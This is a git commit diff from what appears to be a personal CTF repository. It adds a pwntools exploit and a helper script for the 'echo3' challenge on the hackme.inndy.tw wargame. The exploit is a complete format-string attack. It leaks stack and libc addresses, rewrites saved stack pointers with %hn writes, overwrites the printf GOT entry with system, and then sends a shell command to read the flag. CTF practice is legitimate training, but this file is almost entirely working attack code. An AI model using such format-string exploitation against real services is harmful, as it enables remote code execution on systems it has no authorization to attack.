e61e9b55eca40b0808c5c2817b1844c9692ffe1f
M4xW4n9 <aboultraman@gmail.com>
2018-06-02 00:58:00 +0800

    difficult fsb bug, brute force will take a long time

--- inndy_echo3/exp.py
+++ inndy_echo3/exp.py
@@ -9,37 +9,106 @@ context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 elf = ELF("./echo3")
 if sys.argv[1] == "l":
-    context.log_level = "debug"
+    #  context.log_level = "debug"
     # env = {'LD_PRELOAD': ''}
     # io = process("", env = env)
     io = process("./echo3")
+    #  io = gdb.debug("./echo3", gdbscript = '''
+            #  b *0x8048774
+            #  b *0x8048646
+            #  c
+            #  set $eax=0x20
+            #  c
+            #  c
+            #  c
+            #  ''')
     libc = elf.libc
-
 
 else:
     io = remote("hackme.inndy.tw", 7720)
     libc = ELF("./libc-2.23.so.i386")
 
-
-def DEBUG(cmd = ""):
-    raw_input("DEBUG: ")
-    gdb.attach(io, cmd)
-
 if __name__ == "__main__":
-    io.sendline("%18$p")
-    mainEbp = int(io.recvuntil("\n", drop = True), 16)
-    success("mainEbp -> {:#x}".format(mainEbp))
-    hardfmtEbp = mainEbp - 0x50
-    success("hardfmtEbp -> {:#x}".format(hardfmtEbp))
+    '''
+    inndy_echo3 [master●●] python rand.py
+    0x20	4096    <- pick this random number
+    0x1010	2048
+    0x1050	2048
+    0x1030	4096
+    0x2010	2048
+    0x30	4096
+    0x50	2048
+    0x40	4096
+    0x3050	2047
+    0x3010	2048
+    0x2020	4096
+    0x1040	4096
+    0x1020	4096
+    0x3020	4096
+    0x10	2048
+    0x2040	4096
+    0x3030	4096
+    0x3040	4096
+    0x2050	2048
+    0x2030	4096
+    '''
+    info("1st: leak addr")
+    #  io.sendline("%29$p..%30$p..%43$p..flag0\0")
+    io.sendline("%29$p..%30$p..%43$p..\0")
+    #  io.recvuntil("0x")
+    stack1d = int(io.recvuntil("..", drop = True), 16)
+    success("stack1d -> {:#x}".format(stack1d))
+    ret13 = stack1d - 0x108
+    success("ret13 -> {:#x}".format(ret13))
+    stack1e = int(io.recvuntil("..", drop = True), 16)
+    success("stack1e -> {:#x}".format(stack1e))
+    ret17 = stack1e - 0x100
+    success("ret17 -> {:#x}".format(ret17))
+    libc.address = int(io.recvuntil("..", drop = True), 16) - libc.sym['__libc_start_main']
+    libc.address = libc.address - 246 if sys.argv[1] == 'l' else libc.address - 247
+    if libc.address & 0xfff != 0:
+        io.close()
+        print "Fail!"
+        exit(0)
+    success("libc.address -> {:#x}".format(libc.address))
+    #  pause()
 
-    offset = (mainEbp - hardfmtEbp) / 4
-    io.sendline("%{}$p.%{}$p.%{}$p".format(offset - 1, offset, offset))
-    
-    
+    info("2nd: overwrite stack to ret")
+    payload = "%{}c%{}$hn".format(ret13 & 0xffff, 0x1d)
+    #  payload += "%{}c%{}$hn".format((ret17 & 0xffff) - (ret13 & 0xffff), 0x1e)
+    payload += "%{}c%{}$hn".format(16, 0x1e)
+    #  payload += "flag1"
+    sleep(0.01)
+    #  io.sendlineafter("flag0", payload + '\0')
+    io.sendline(payload)
+    #  pause()
 
+    info("3rd: overwrite ret to got")
+    payload = "%{}c%{}$hn".format(elf.got['printf'] & 0xffff, 0x55)
+    #  payload += "%{}c%hn".format(((elf.got['printf'] + 2) & 0xffff) - (elf.got['printf'] & 0xffff), 0x57)
+    payload += "%{}c%{}$hn".format(2, 0x57)
+    #  payload += "flag2"
+    sleep(0.01)
+    #  io.sendlineafter("flag1", payload + '\0')
+    io.sendline(payload)
+    #  pause()
+
+    info("4th: overwrite got")
+    payload = "%{}c%{}$hhn".format(libc.sym['system'] >> 16 & 0xff, 0x17)
+    payload += "%{}c%{}$hn".format((libc.sym['system'] & 0xffff) - (libc.sym['system'] >> 16 & 0xff), 0x13)
+    #  payload += "flag3"
+    sleep(0.01)
+    #  io.sendlineafter("flag2", payload + '\0')
+    io.sendline(payload)
+    #  pause()
+
+    info("5th: triger system('/bin/sh\0')")
+    sleep(0.01)
+    #  context.log_level = "debug"
+    #  io.sendlineafter("flag3", "/bin/sh\0")
+    #  io.sendline("/bin/sh\0")
+    io.sendline("cat flag\0;")
+    io.sendline("\n")
      
     io.interactive()
     io.close()
-
-
-
---
+++ inndy_echo3/rand.py
@@ -0,0 +1,12 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+__Auther__ = 'M4x'
+
+f = lambda x: 16 * (((x & 0x3039) + 30) / 0x10)
+
+allrand = []
+for i in xrange(0xffff):
+    allrand.append(f(i))
+
+for i in set(allrand):
+    print "{:#x}\t{}".format(i, allrand.count(i))
